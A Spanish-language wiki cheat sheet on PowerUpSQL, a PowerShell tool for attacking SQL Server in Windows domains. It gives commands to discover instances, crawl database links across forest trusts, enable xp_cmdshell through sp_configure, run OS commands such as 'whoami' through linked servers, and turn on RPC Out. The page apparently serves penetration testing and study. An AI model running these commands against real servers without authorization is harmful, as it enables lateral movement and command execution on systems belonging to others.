---
title: "PowerUpSQL Cheat Sheet"
category: "AD"
description: "Herramienta para descubrir, auditar y escalar privilegios en servidores SQL Server dentro del dominio."
image: "/images/wiki/3.png"
---

# PowerUpSQL: Escalada de Privilegios en SQL Server

**PowerUpSQL** es una herramienta de PowerShell para atacar SQL Server. Permite descubrir instancias, auditar configuraciones débiles y ejecutar comandos si se tienen los privilegios adecuados.

[Repositorio Oficial](https://github.com/NetSPI/PowerUpSQL)

## Descubrimiento y Enumeración

*   **Descubrir Instancias SQL en el Dominio**:
    `Get-SQLInstanceDomain`
*   **Verificar Accesibilidad (Ping/Conexión)**:
    `Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose`
*   **Obtener Información del Servidor**:
    `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`

## Abuso de Enlaces de Base de Datos (Database Links)

Los enlaces de base de datos permiten a un servidor SQL acceder a otros recursos o servidores SQL. Estos enlaces pueden funcionar incluso a través de confianzas de bosques.

*   **Enumerar Enlaces**:
    `Get-SQLServerLink -Instance <SPN> -Verbose`
*   **Crawling de Enlaces (Búsqueda Profunda)**:
    Busca enlaces que llevan a otros enlaces, mapeando la red de SQL.
    `Get-SQLServerLinkCrawl -Instance <SPN> -Verbose`
*   **Ejecución de Queries en Enlaces**:
    `Get-SQLServerLinkCrawl -Instance <SPN> -Query "exec master..xp_cmdshell 'whoami'"`

## Ejecución de Comandos (xp_cmdshell)

Si tienes privilegios de `sa` (System Administrator) o configuraciones débiles, puedes habilitar `xp_cmdshell` para ejecutar comandos del sistema operativo.

### Manualmente (SQL Query)

```sql
-- Habilitar opciones avanzadas
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Habilitar xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Ejecutar comando
EXEC xp_cmdshell 'whoami';
```

### Vía Enlaces (RPC Out)

Para ejecutar `xp_cmdshell` a través de un enlace, RPC Out debe estar habilitado.

```sql
EXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true';
EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';
```
